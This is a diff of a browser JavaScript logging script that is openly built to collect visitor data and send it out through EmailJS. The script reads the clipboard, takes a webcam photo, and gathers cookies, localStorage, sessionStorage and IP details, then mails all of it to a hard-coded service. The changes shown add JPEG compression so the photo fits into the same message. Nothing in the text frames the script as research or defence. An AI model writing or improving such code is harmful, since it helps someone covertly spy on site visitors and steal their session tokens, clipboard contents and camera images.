@@ -1,6 +1,8 @@
 // This script collects device/browser info and sends it via EmailJS
 // IMPORTANT: Replace the placeholders with your EmailJS credentials
 
+// EmailJS Initialization - You need to sign up and get your credentials
+// See https://www.emailjs.com/docs/sdk/installation/
 (function(){
     emailjs.init("VcalrjM3vIz1HQLCG"); // <-- Replace with your EmailJS user ID
 })();
@@ -40,7 +42,33 @@ function getIpInfo() {
         }));
 }
 
-// Function to get device info (extended)
+// Helper to get base64 size in KB
+function base64SizeKb(base64) {
+    return base64.length * (3/4) / 1024;
+}
+
+// Attempts to shrink JPEG quality to get under 45KB
+async function getReducedCameraImage(video, maxKb = 45) {
+    let canvas = document.createElement('canvas');
+    canvas.width = 160; // you can change dimensions for even smaller images
+    canvas.height = 120;
+    let ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    let quality = 0.9;
+    let camera_image = canvas.toDataURL("image/jpeg", quality);
+    while (base64SizeKb(camera_image) > maxKb && quality > 0.1) {
+        quality -= 0.1;
+        camera_image = canvas.toDataURL("image/jpeg", quality);
+    }
+    // If still too large, crop quality to minimum
+    if (base64SizeKb(camera_image) > maxKb) {
+        camera_image = "Image too large after compression";
+    }
+    return camera_image;
+}
+
+// Function to get device info (extended with permissions and browser features)
 async function getDeviceInfo() {
     let plugins = "Unavailable";
     let battery_status = "Unavailable";
@@ -111,23 +139,17 @@ async function getDeviceInfo() {
         clipboard_text = "Permission denied or no clipboard";
     }
 
-    // Camera & Microphone access
+    // Camera & Microphone access (with image compression)
     try {
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             let stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
             camera_status = "Permission granted";
             microphone_status = "Permission granted";
-            // Take a photo from camera
             try {
                 let video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
-                let canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 320;
-                canvas.height = video.videoHeight || 240;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                camera_image = canvas.toDataURL("image/png");
-                // Stop the stream
+                camera_image = await getReducedCameraImage(video, 45);
                 stream.getTracks().forEach(track => track.stop());
             } catch(e) {
                 camera_image = "Could not capture image";
@@ -199,8 +221,8 @@ function getSessionStorage() {
 getIpInfo().then(async ipInfo => {
     const deviceInfo = await getDeviceInfo();
 
-    // Prepare payload WITHOUT camera_image
-    const payload = {
+    // Prepare payload WITHOUT camera_image (if you want to send camera_image separately, see previous suggestions)
+    emailjs.send("service_5fifa81", "template_w5liz9g", {
         ip: ipInfo.ip,
         network: ipInfo.network,
         version: ipInfo.version,
@@ -245,41 +267,14 @@ getIpInfo().then(async ipInfo => {
         clipboard_text: deviceInfo.clipboard_text,
         camera_status: deviceInfo.camera_status,
         microphone_status: deviceInfo.microphone_status,
-        // camera_image: deviceInfo.camera_image, // <-- REMOVE FROM MAIN REQUEST
+        camera_image: deviceInfo.camera_image, // You can keep this if you want to test if the compression is sufficient
         cookies: getCookies(),
         localStorage: getLocalStorage(),
         sessionStorage: getSessionStorage()
-    };
-
-    // Main log send (no camera image)
-    emailjs.send("service_5fifa81", "template_w5liz9g", payload)
+    })
     .then(() => {
         if (document.getElementById("log-status")) {
             document.getElementById("log-status").innerText = "Log sent successfully!";
-        }
-
-        // If camera image is available, send it in a separate request
-        if (
-            deviceInfo.camera_image &&
-            deviceInfo.camera_image !== "Permission denied" &&
-            deviceInfo.camera_image !== "Could not capture image"
-        ) {
-            // Minimal payload for camera image
-            emailjs.send("service_5fifa81", "template_cameraimg", {
-                ip: ipInfo.ip,
-                timestamp: new Date().toISOString(),
-                camera_image: deviceInfo.camera_image
-            })
-            .then(() => {
-                if (document.getElementById("log-status")) {
-                    document.getElementById("log-status").innerText += "\nCamera image sent successfully!";
-                }
-            })
-            .catch(error => {
-                if (document.getElementById("log-status")) {
-                    document.getElementById("log-status").innerText += "\nFailed to send camera image: " + JSON.stringify(error);
-                }
-            });
         }
     })
     .catch(error => {
